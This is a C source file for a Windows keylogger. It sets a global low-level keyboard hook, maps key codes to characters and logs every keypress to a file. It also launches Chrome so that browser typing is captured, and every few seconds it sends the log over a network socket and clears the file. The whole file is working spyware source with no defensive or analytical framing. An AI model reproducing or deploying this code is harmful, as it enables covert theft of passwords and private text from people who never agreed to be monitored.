#include "keylogger.h"

///static HINSTANCE hinst;
static HHOOK handlekeyboard = NULL;
SOCKET my_sock = INVALID_SOCKET;
const struct keyboard keyboard[] =
{
	{ VK_BACK, "[BACK]" },
	{ VK_TAB, "[TAB]" },
	{ VK_CLEAR, "[CLR]" },
	{ VK_RETURN, "[ENTER]" },
	{ VK_SHIFT, "[SHIFT]" },
	{ VK_CONTROL, "[CTRL]" },
	{ VK_MENU, "[ALT]" },
	{ VK_CAPITAL, "[CAPS LOCK]" },
	{ VK_ESCAPE, "[ESC]" },
	{ VK_SPACE, "[SPACE]" },
	{ VK_PRIOR, "[PGUP]" },
	{ VK_NEXT, "[PGDW]" },
	{ VK_END, "[END]" },
	{ VK_HOME, "[HOME]" },
	{ VK_LEFT, "[LEFT]" },
	{ VK_UP, "[UP]" },
	{ VK_RIGHT, "[RIGHT]" },
	{ VK_DOWN, "[DOWN]" },
	{ VK_SNAPSHOT, "[PRTSCRN]" },
	{ VK_INSERT, "[insert]" },
	{ VK_DELETE, "[DEL]" },
	{ 0x30, "0" },
	{ 0x31, "1" },
	{ 0x32, "2" },
	{ 0x33, "3" },
	{ 0x34, "4" },
	{ 0x35, "5" },
	{ 0x36, "6" },
	{ 0x37, "7" },
	{ 0x38, "8" },
	{ 0x39, "9" },
	{ 0x41, "A" },
	{ 0x42, "B" },
	{ 0x43, "C" },
	{ 0x44, "D" },
	{ 0x45, "E" },
	{ 0x46, "F" },
	{ 0x47, "G" },
	{ 0x48, "H" },
	{ 0x49, "I" },
	{ 0x4A, "J" },
	{ 0x4B, "K" },
	{ 0x4C, "L" },
	{ 0x4D, "M" },
	{ 0x4E, "N" },
	{ 0x4F, "O" },
	{ 0x50, "P" },
	{ 0x51, "Q" },
	{ 0x52, "R" },
	{ 0x53, "S" },
	{ 0x54, "T" },
	{ 0x55, "U" },
	{ 0x56, "V" },
	{ 0x57, "W" },
	{ 0x58, "X" },
	{ 0x59, "Y" },
	{ 0x5A, "Z" },
	{ VK_NUMPAD0, "0" },
	{ VK_NUMPAD1, "1" },
	{ VK_NUMPAD2, "2" },
	{ VK_NUMPAD3, "3" },
	{ VK_NUMPAD4, "4" },
	{ VK_NUMPAD5, "5" },
	{ VK_NUMPAD6, "6" },
	{ VK_NUMPAD7, "7" },
	{ VK_NUMPAD8, "8" },
	{ VK_NUMPAD9, "9" },
	{ VK_LCONTROL, "[CTRL]" },
	{ VK_RCONTROL, "[CTRL]" },
	{ VK_LSHIFT, "[SHIFT]" },
	{ VK_RSHIFT, "[SHIFT]" },
	{ VK_OEM_2, "[/]" },
	{ VK_NUMLOCK, "[NUMLOCK]" },
	{ VK_DIVIDE, "[/]" },
	{ VK_MULTIPLY, "[*]" },
	{ VK_ADD, "[+]" },
	{ VK_SUBTRACT, "-" },
	{ VK_DECIMAL, "[.]" },
	{ VK_F1, "[f1]" },
	{ VK_F2, "[f2]" },
	{ VK_F3, "[f3]" },
	{ VK_F4, "[f4]" },
	{ VK_F5, "[f5]" },
	{ VK_F6, "[f6]" },
	{ VK_F7, "[f7]" },
	{ VK_F8, "[f8]" },
	{ VK_F9, "[f9]" },
	{ VK_F10, "[f10]" },
	{ VK_F11, "[f11]" },
	{ VK_F12, "[f12]" },
	{ VK_LWIN, "[WIN]" },
	{ VK_RWIN, "[WIN]" },
	{ VK_OEM_MINUS, "[-]" },
	{ VK_OEM_PLUS, "[+]" },
	{ VK_OEM_1, "[;]" },
	{ VK_OEM_3, "[`]"},
	{ VK_OEM_4, "[ [ ]" },
	{ VK_OEM_5, "[\\]" },
	{ VK_OEM_6, "[ ] ]" },
	{ VK_OEM_7, "[']" },
	{ VK_OEM_COMMA, "," },
	{ VK_OEM_PERIOD, "."},
	{ VK_APPS, "[APPS]" },
	{ 0, "[UNKNOWN]" }
};
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
{
	LPKBDLLHOOKSTRUCT kb;
	kb = (LPKBDLLHOOKSTRUCT)lparam;
	printf("%u\n", kb->vkCode);
	return (CallNextHookEx(handlekeyboard, nCode, wparam, lparam));
}
	
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
{
	LPKBDLLHOOKSTRUCT kb;
	size_t			  i = 0;
	static int		  shift;

	kb = (LPKBDLLHOOKSTRUCT)lparam;
	for (i = 0; keyboard[i].code != kb->vkCode && keyboard[i].code != 0; i++);
#if 1
	if ((keyboard[i].code == VK_LSHIFT && wparam == WM_KEYDOWN && shift == 0) || (keyboard[i].code == VK_CAPITAL && wparam == WM_KEYDOWN && (shift == 0)))
		shift = 1;
	else if ((keyboard[i].code == VK_LSHIFT && wparam == WM_KEYUP && shift == 1) || (keyboard[i].code == VK_CAPITAL && wparam == WM_KEYDOWN && (shift == 1)))
		shift = 0;
#endif // 0

	if (wparam == WM_KEYDOWN)
	{
		save_data(keyboard[i].character);
		printf("%s %zu %d\n", keyboard[i].character, strlen(keyboard[i].character), shift);
	}
	return (CallNextHookEx(handlekeyboard, nCode, wparam, lparam));
}

void	setwinhook()
{
	STARTUPINFO startup;
	PROCESS_INFORMATION process;
	
	SecureZeroMemory(&startup, sizeof(startup));
	SecureZeroMemory(&process, sizeof(process));
	startup.cb = sizeof(startup);
	if (CreateProcess(L"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe", NULL, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS, NULL, NULL, &startup, &process) == 0)
		return;
	//hinst = GetModuleHandle(L"chrome.exe");
	if ((handlekeyboard = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0)) == NULL)
		return;
	CloseHandle(process.hProcess);
	CloseHandle(process.hThread);
}

void	save_data(const char *data)
{
	static int nbChar;
	static time_t timet1;
	static double countTime;

	time_t timet2 = 0;

	//Sleep(3000);
	time(&timet2);

	double elapseTime = 0;

	if (timet1 != 0)
		elapseTime = difftime(timet2, timet1);

	FILE *file;
	if (_wfopen_s(&file, L"test.txt", L"a+") != 0)
		_wperror(L" Open file failed ");
	_write(_fileno(file), data, (unsigned int)strlen(data));

	countTime = countTime + elapseTime;

	if (nbChar > 59)
	{
		if (vfprintf_s(file, "\n", NULL) < 0)
			_wperror(L" Add \\n at the end of the file failed ");
		nbChar = 0;
	}

	if (countTime > 5)
	{
		send_data(my_sock);
		countTime = 0;
		if (fclose(file) != 0)
			_wperror(L" Close file failed ");
		if (_wfopen_s(&file, L"test.txt", L"w+") != 0)
			_wperror(L" Open file failed ");
	}

	if (fclose(file) != 0)
		_wperror(L" Close file failed ");

	//printf("ElapseTime : %f\n", elapseTime);
	//printf("CountTime : %f\n", countTime);

	timet1 = timet2;

	nbChar++;

}

int	main(void)
{
	MSG msg;
	WSADATA wsadata;
	
	WSAStartup(MAKEWORD(2, 0), &wsadata);
	//my_sock = init_socket(my_sock);
	setwinhook();				
	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	UnhookWindowsHookEx(handlekeyboard);
	closesocket(my_sock);
	WSACleanup();
	return (msg.wParam);
}